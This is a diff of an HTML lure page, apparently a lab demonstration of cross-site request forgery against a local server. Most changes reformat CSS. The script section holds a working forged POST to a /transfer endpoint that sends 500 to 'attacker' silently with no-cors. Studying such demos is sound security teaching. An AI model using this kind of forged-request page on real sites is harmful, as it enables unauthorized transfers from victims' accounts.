@@ -1,6 +1,7 @@
 <!-- Malicious HTML hosted on an attacker's site -->
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -51,15 +52,34 @@
     }
 
     @keyframes glitter {
-      0% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.2); opacity: 0.8; }
-      100% { transform: scale(1); opacity: 1; }
+      0% {
+        transform: scale(1);
+        opacity: 1;
+      }
+
+      50% {
+        transform: scale(1.2);
+        opacity: 0.8;
+      }
+
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
     }
 
     @keyframes sparkle {
-      0% { text-shadow: 0 0 10px rgba(255, 255, 0, 0.8), 0 0 20px rgba(255, 255, 0, 0.8); }
-      50% { text-shadow: 0 0 30px rgba(255, 255, 0, 1), 0 0 50px rgba(255, 255, 0, 1); }
-      100% { text-shadow: 0 0 10px rgba(255, 255, 0, 0.8), 0 0 20px rgba(255, 255, 0, 0.8); }
+      0% {
+        text-shadow: 0 0 10px rgba(255, 255, 0, 0.8), 0 0 20px rgba(255, 255, 0, 0.8);
+      }
+
+      50% {
+        text-shadow: 0 0 30px rgba(255, 255, 0, 1), 0 0 50px rgba(255, 255, 0, 1);
+      }
+
+      100% {
+        text-shadow: 0 0 10px rgba(255, 255, 0, 0.8), 0 0 20px rgba(255, 255, 0, 0.8);
+      }
     }
 
     .btn {
@@ -79,6 +99,7 @@
     }
   </style>
 </head>
+
 <body>
 
   <h1>🎉 Welcome to the Free Offer! 🎉</h1>
@@ -101,7 +122,7 @@
   <script>
     function startAttack() {
       // Send the forged POST request without redirecting the user
-      fetch("http://localhost:3000/transfer", {
+      fetch("http://localhost:3003/transfer", {
         method: "POST",
         headers: {
           "Content-Type": "application/x-www-form-urlencoded",
@@ -111,7 +132,7 @@
           to: "attacker",
           amount: "500",
         }),
-        mode:"no-cors"
+        mode: "no-cors"
       })
         .then((response) => response.text())
         .then((data) => {
@@ -124,4 +145,5 @@
   </script>
 
 </body>
+
 </html>
